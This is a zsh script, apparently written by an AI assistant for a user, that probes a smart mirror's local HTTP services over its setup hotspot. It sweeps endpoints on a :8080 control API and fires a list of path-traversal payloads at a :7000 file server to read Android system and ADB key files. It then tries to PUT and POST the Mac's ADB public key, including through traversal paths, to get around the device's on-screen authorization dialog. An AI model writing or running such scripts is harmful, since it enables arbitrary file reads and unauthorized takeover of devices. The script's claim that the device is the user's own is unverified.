#!/bin/zsh

# Read-mostly recon of the Mirror's local HTTP services on its setup hotspot.
# Run AFTER joining Wi-Fi network "mirror-be9d0af".
# It maps the :8080 control API and the :7000 file server, and (safely, on the
# user's own device) tries to read a few Android system files and to install
# the Mac's existing ADB public key so adb can authorize without a screen dialog.
# It does NOT change the Mirror's Wi-Fi, reboot it, or delete anything.

set -u
MIRROR="192.168.43.1"
OUT="/Users/mj/Documents/mirror-mirror/mirror-api-probe.txt"
PUBKEY="$HOME/.android/adbkey.pub"

exec > >(tee "$OUT") 2>&1

echo "Mirror API probe"
date
echo

# --- confirm we're on the hotspot ---
ip="$(ipconfig getifaddr en0 2>/dev/null || true)"
echo "Mac IP on en0: ${ip:-none}"
if [[ "$ip" != 192.168.43.* ]]; then
  echo "!! Not on the mirror-be9d0af hotspot (need a 192.168.43.x address)."
  echo "   Join mirror-be9d0af in Wi-Fi settings, keep it connected even with no internet, then rerun."
  exit 1
fi
if ! curl -s --max-time 4 "http://$MIRROR:8080/" >/dev/null 2>&1; then
  echo "!! Cannot reach $MIRROR:8080. Confirm you're on the hotspot and rerun."
  exit 1
fi
echo "Reachable: $MIRROR"
echo

req() {  # req METHOD URL  -> status line + headers + first 1500 bytes of body
  local method="$1" url="$2"
  echo "----- $method $url -----"
  curl -k -s -i -X "$method" --max-time 5 --max-filesize 262144 "$url" 2>/dev/null | sed -n '1,80p'
  echo
}

echo "############################################################"
echo "# PORT 8080 - control / provisioning API"
echo "############################################################"
echo
echo "=== root status (GET and OPTIONS) ==="
req GET  "http://$MIRROR:8080/"
req OPTIONS "http://$MIRROR:8080/"

echo "=== endpoint sweep (GET) ==="
paths8080=(
  status info state health ping version device device_info
  wifi wifi/status wifi/scan wifi/networks wifi/list scan networks network
  available_networks connect provision setup oobe config settings system
  api api/status api/v1/status command commands debug adb keys logs log
  reboot restart update capabilities identity serial name diagnostics
)
for p in $paths8080; do
  echo "----- GET /$p -----"
  code=$(curl -k -s -o /tmp/_b8 -w '%{http_code}' --max-time 4 "http://$MIRROR:8080/$p" 2>/dev/null)
  echo "HTTP $code"
  if [[ "$code" != 404 && "$code" != 000 ]]; then
    echo "ALLOW:"; curl -k -s -i -X OPTIONS --max-time 4 "http://$MIRROR:8080/$p" 2>/dev/null | grep -i '^allow:'
    head -c 800 /tmp/_b8; echo
  fi
done
echo

echo "############################################################"
echo "# PORT 7000 - file server (usage: GET /example/file.html)"
echo "############################################################"
echo
echo "=== baseline ==="
req GET "http://$MIRROR:7000/"
req GET "http://$MIRROR:7000/index.html"
req GET "http://$MIRROR:7000/example/file.html"

echo "=== path-traversal / arbitrary-file-read attempts ==="
files7000=(
  "system/build.prop"
  "default.prop"
  "proc/version"
  "proc/cpuinfo"
  "etc/hosts"
  "init.rc"
  "data/local.prop"
  "data/misc/adb/adb_keys"
  "vendor/build.prop"
  "../system/build.prop"
  "../../system/build.prop"
  "../../../system/build.prop"
  "../../../../system/build.prop"
  "../../../../../system/build.prop"
  "..%2f..%2f..%2fsystem%2fbuild.prop"
  "%2e%2e/%2e%2e/%2e%2e/system/build.prop"
  "example/../../../system/build.prop"
  "example/../../../data/misc/adb/adb_keys"
)
for f in $files7000; do
  echo "----- GET /$f -----"
  code=$(curl -k -s -o /tmp/_b7 -w '%{http_code}' --max-time 4 "http://$MIRROR:7000/$f" 2>/dev/null)
  bytes=$(wc -c < /tmp/_b7 | tr -d ' ')
  echo "HTTP $code  ($bytes bytes)"
  if [[ "$code" == 200 && "$bytes" -gt 0 ]]; then
    echo ">>> CONTENT:"; head -c 1500 /tmp/_b7; echo; echo ">>> END"
  fi
done
echo

echo "############################################################"
echo "# Best-effort: install ADB key (device is yours; key is benign)"
echo "############################################################"
echo
if [[ -f "$PUBKEY" ]]; then
  KEY="$(cat "$PUBKEY")"
  # Try common write verbs/paths on both services. Harmless if they 404.
  for base in "http://$MIRROR:8080" "http://$MIRROR:7000"; do
    for path in "adb_keys" "adb/keys" "keys" "data/misc/adb/adb_keys" "example/../../../data/misc/adb/adb_keys"; do
      for verb in PUT POST; do
        code=$(curl -k -s -o /tmp/_bw -w '%{http_code}' -X "$verb" --max-time 4 \
               --data-binary "$KEY" "$base/$path" 2>/dev/null)
        [[ "$code" != 404 && "$code" != 000 && "$code" != 405 ]] && \
          { echo "$verb $base/$path -> HTTP $code"; head -c 300 /tmp/_bw; echo; }
      done
    done
  done
  echo "(any non-404/405 responses above are worth a closer look)"
else
  echo "No $PUBKEY found; skipping."
fi
echo

echo "############################################################"
echo "# ADB re-check over USB (works regardless of Wi-Fi)"
echo "############################################################"
adb kill-server >/dev/null 2>&1
sleep 1
adb devices -l
echo "build.type:"; adb shell getprop ro.build.type 2>&1 | head -1
echo

echo "Finished. Results saved to: $OUT"
echo "Rejoin your normal Wi-Fi and tell me 'done'."
